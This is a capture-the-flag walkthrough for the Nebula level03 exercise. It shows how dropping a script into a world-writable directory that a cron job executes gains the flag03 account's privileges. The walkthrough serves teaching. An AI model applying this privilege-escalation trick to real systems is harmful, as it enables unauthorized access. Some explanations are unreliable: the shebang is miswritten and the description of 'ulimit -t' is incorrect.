Let's see what we have in the challenge directory.

```
$ cd /home/flag03
$ ls
writable.d  writeable.sh
$ ls writable.d

```

So looking at this, in the challenge directory we have a bash script, and a directory that has nothing in it. This bash script is probably being run by the crontabs (which are just automated linux tasks), so let's see what the script does.

```
$ cat writable.sh
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

So looking at this code, firstly it lays out a direct path to bash so we can't exploit that. Proceeding that it looks for files in "/home/flag03/writable.d/", and for each file it will run it as a bash file then remove it. The "ulimit -t 5;" just limits the amount of running processes, so we can't essentially DOS the OS.
So from what we see here, we should be able to place a bash script in "/home/flag03/writable.d" that will run getflag, and it will run it then remove it. Let's test that...

```
$ nano /home/flag03/writable.d/exploit.sh
$ cat exploit.sh
!#/bin/sh

/bin/getflag >> /tmp/out
```
The bash script I wrote as you can see will just run getflag, and pipe the output to a file in /tmp/. And after a couple of minutes, the cron job should run and our bash script should be removed. and /tmp/out should exist.

```
$ ls /home/flag03/writable.d/
$ cat /tmp/out
You have successfully executed getflag on a target account
```

And just like that, we pwned the program.

Sources: http://cybergibbons.com/security-2/nebula-walkthrough/nebula-exploit-exercises-walkthrough-level03/
